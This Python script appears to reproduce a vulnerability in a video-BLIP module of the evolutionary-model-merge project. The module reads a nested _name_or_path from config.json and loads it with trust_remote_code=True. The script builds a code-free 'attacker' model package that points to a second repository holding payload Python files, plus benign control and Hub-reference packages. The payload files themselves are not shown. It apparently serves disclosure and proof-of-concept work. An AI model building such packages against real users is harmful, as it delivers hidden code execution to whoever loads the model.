#!/usr/bin/env python
"""Build the model packages used by this reproduction.

SakanaAI/evolutionary-model-merge @ 09aff543, file
`evomerge/modules/heron/video_blip/configuration_video_blip.py` reads

    model_path = text_config["_name_or_path"]          # line 385
    self.text_config = AutoConfig.from_pretrained(      # line 387
        model_path, trust_remote_code=True
    )

`text_config` is the nested dictionary of the config.json of the model package
the victim loads.  The packages below therefore are:

  attacker side (the delivered model package - JSON and weights only, no Python)
    work/attacker/model-A-evil/     text_config._name_or_path -> work/attacker/model-B-evil
  control side (same package, only that one field differs)
    work/control/model-A-control/   text_config._name_or_path -> work/benign/model-B-plain
  remote-reference case
    work/hub/model-A-hub/           text_config._name_or_path -> a real Hub repository id

  second repositories named by that field
    work/attacker/model-B-evil/     config.json + configuration_poc_stablelm.py (payload)
    work/benign/model-B-plain/      config.json only, no code
"""

import hashlib
import json
import pathlib
import shutil

from pinned_import import load_video_blip

HERE = pathlib.Path(__file__).resolve().parent
WORK = HERE / "work"

A_EVIL = WORK / "attacker" / "model-A-evil"
B_EVIL = WORK / "attacker" / "model-B-evil"
A_CONTROL = WORK / "control" / "model-A-control"
B_PLAIN = WORK / "benign" / "model-B-plain"
A_HUB = WORK / "hub" / "model-A-hub"

# The real Heron checkpoint whose config.json carries this field
# (turing-motors/heron-chat-blip-ja-stablelm-base-7b-v1-llava-620k):
HUB_TEXT_REPO = "stabilityai/japanese-stablelm-base-alpha-7b"

# Tiny but structurally valid dimensions - the repro must not download or
# allocate a 7B model.
TEXT = {
    "model_type": "gpt_neox",
    "vocab_size": 64,
    "hidden_size": 32,
    "num_hidden_layers": 1,
    "num_attention_heads": 2,
    "intermediate_size": 64,
    "max_position_embeddings": 16,
    "hidden_act": "gelu",
}
VISION = {
    "hidden_size": 32,
    "intermediate_size": 64,
    "projection_dim": 16,
    "num_hidden_layers": 1,
    "num_attention_heads": 2,
    "num_channels": 3,
    "image_size": 32,
    "patch_size": 8,
    "hidden_act": "gelu",
    "layer_norm_eps": 1e-05,
    "initializer_range": 0.02,
}
QFORMER = {
    "vocab_size": 128,
    "hidden_size": 32,
    "num_hidden_layers": 1,
    "num_attention_heads": 2,
    "intermediate_size": 64,
    "hidden_act": "gelu",
    "max_position_embeddings": 32,
    "layer_norm_eps": 1e-12,
    "cross_attention_frequency": 1,
    "encoder_hidden_size": VISION["hidden_size"],
}


def write_json(path: pathlib.Path, data: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2) + "\n")


def build_second_repositories() -> None:
    """Write the two repositories that the nested field can point at."""
    if B_EVIL.exists():
        shutil.rmtree(B_EVIL)
    if B_PLAIN.exists():
        shutil.rmtree(B_PLAIN)

    # B-plain: an ordinary config, no custom code at all.
    plain_config = dict(TEXT)
    plain_config["_name_or_path"] = str(B_PLAIN)
    write_json(B_PLAIN / "config.json", plain_config)

    # B-evil: same numbers, plus an auto_map that names its python files.
    evil_config = dict(TEXT)
    evil_config["_name_or_path"] = str(B_EVIL)
    evil_config["architectures"] = ["PoCStableLMModel"]
    evil_config["auto_map"] = {
        "AutoConfig": "configuration_poc_stablelm.PoCStableLMConfig",
        "AutoModelForCausalLM": "modeling_poc_stablelm.PoCStableLMModel",
    }
    write_json(B_EVIL / "config.json", evil_config)
    for name in ("configuration_poc_stablelm.py", "modeling_poc_stablelm.py"):
        shutil.copyfile(HERE / "payload" / name, B_EVIL / name)


def build_template_package() -> pathlib.Path:
    """Build one real (tiny) video_blip package with the pinned classes."""
    video_blip = load_video_blip()
    config = video_blip.VideoBlipConfig(
        vision_config=dict(VISION),
        qformer_config=dict(QFORMER),
        text_config=dict(TEXT, _name_or_path=str(B_PLAIN)),
        num_query_tokens=2,
        llm_hidden_size=TEXT["hidden_size"],
        num_frames=1,
        use_decoder_only_language_model=True,
    )
    model = video_blip.VideoBlipForConditionalGeneration(config)
    template = WORK / "template" / "model-A-template"
    if template.exists():
        shutil.rmtree(template)
    model.save_pretrained(template)
    return template


def repoint(template: pathlib.Path, target: pathlib.Path, nested_value: str) -> None:
    """Copy the template and change ONLY the nested _name_or_path string."""
    if target.exists():
        shutil.rmtree(target)
    shutil.copytree(template, target)
    config_path = target / "config.json"
    text = config_path.read_text()
    old = f'"_name_or_path": "{B_PLAIN}"'
    new = f'"_name_or_path": "{nested_value}"'
    assert text.count(old) == 1, f"expected exactly one nested _name_or_path, got {text.count(old)}"
    config_path.write_text(text.replace(old, new))


def sha256(path: pathlib.Path) -> str:
    digest = hashlib.sha256()
    digest.update(path.read_bytes())
    return digest.hexdigest()


def main() -> None:
    # rebuild from scratch: an old transformers module cache would shadow the
    # payload files with the copies cached during a previous run
    shutil.rmtree(WORK, ignore_errors=True)
    WORK.mkdir(parents=True, exist_ok=True)
    build_second_repositories()
    template = build_template_package()

    repoint(template, A_EVIL, str(B_EVIL))
    repoint(template, A_CONTROL, str(B_PLAIN))
    repoint(template, A_HUB, HUB_TEXT_REPO)
    shutil.rmtree(template)

    print("built model packages under", WORK)
    for label, package in (
        ("A-evil    (attacker package)", A_EVIL),
        ("A-control (same, benign field)", A_CONTROL),
        ("A-hub     (real Hub repo id)", A_HUB),
        ("B-evil    (second repo, payload)", B_EVIL),
        ("B-plain   (second repo, no code)", B_PLAIN),
    ):
        files = sorted(p.name for p in package.iterdir())
        print(f"  {label}: {package.relative_to(HERE)}")
        print(f"      files: {', '.join(files)}")

    python_in_a = sorted(p.name for p in A_EVIL.rglob("*.py"))
    print()
    print("python files inside the delivered package A-evil:", python_in_a or "none")
    print("auto_map inside A-evil:", "auto_map" in (A_EVIL / "config.json").read_text())
    print()
    print("nested attack field read by configuration_video_blip.py:385 -")
    for label, package in (("A-evil", A_EVIL), ("A-control", A_CONTROL), ("A-hub", A_HUB)):
        data = json.loads((package / "config.json").read_text())
        value = data["text_config"]["_name_or_path"]
        print(f'  {label:9s} text_config["_name_or_path"] = {value}')

    sums = WORK / "SHA256SUMS.txt"
    lines = []
    for package in (A_EVIL, A_CONTROL, A_HUB, B_EVIL, B_PLAIN):
        for path in sorted(package.rglob("*")):
            if path.is_file():
                lines.append(f"{sha256(path)}  {path.relative_to(WORK).as_posix()}")
    sums.write_text("\n".join(lines) + "\n")
    print()
    print("hashes written to", sums.relative_to(HERE))


if __name__ == "__main__":
    main()
